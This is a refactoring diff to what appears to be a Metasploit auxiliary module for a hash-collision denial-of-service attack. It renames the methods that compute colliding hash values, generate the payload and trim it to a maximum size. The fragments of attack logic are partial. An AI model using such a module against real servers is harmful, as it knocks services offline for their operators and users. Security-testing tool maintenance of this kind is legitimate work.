@@ -67,12 +67,12 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 	end
 
-	def generatePayload
+	def generate_payload
 		# Taken from:
 		# https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
 
 		@recursivecounter = 1
-		collisionchars = computeCollisionChars
+		collisionchars = compute_collision_chars
 		return nil if collisionchars == nil
 		length = datastore['payloadlength']
 		size = collisionchars.length
@@ -91,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
 		return post
 	end
 
-	def computeCollisionChars
+	def compute_collision_chars
 		print_status("Trying to find Hashes...") if @recursivecounter == 1
 		hashes = {}
 		counter = 0
@@ -128,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			print_status("#{@recursivecounter}: Not enough values found. Trying it again...")
 			@recursivecounter = @recursivecounter + 1
-			hashes = computeCollisionChars
+			hashes = compute_collision_chars
 		else
 			print_status("Found values:")
 			hashes.each_value {|item|
@@ -181,7 +181,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		print_status("Generating Payload...")
-		payload = generatePayload
+		payload = generate_payload
 		return if payload == nil
 		# trim to maximum payload size (in MB)
 		maxinmb = datastore['maxpayloadsize']*1024*1024
